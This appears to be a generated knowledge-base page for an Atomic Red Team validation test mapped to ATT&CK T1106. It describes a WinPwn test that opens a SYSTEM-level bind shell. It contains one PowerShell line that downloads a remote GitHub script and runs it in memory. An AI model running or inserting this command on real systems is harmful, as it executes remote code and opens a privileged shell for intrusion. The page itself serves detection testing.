---
atomic_guid: "7ec5b74e-8289-4ff2-a162-b6f286a33abd"
title: "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique"
framework: "atomic"
generated: "true"
attack_technique_id: "T1106"
attack_technique_name: "Native API"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "7ec5b74e-8289-4ff2-a162-b6f286a33abd"
  - "WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique

Get SYSTEM shell - Bind System Shell using CreateProcess technique via function of WinPwn

## Metadata

- Atomic GUID: 7ec5b74e-8289-4ff2-a162-b6f286a33abd
- Technique: T1106: Native API
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1106/T1106.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1106-native_api|T1106]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1106/T1106.yaml)
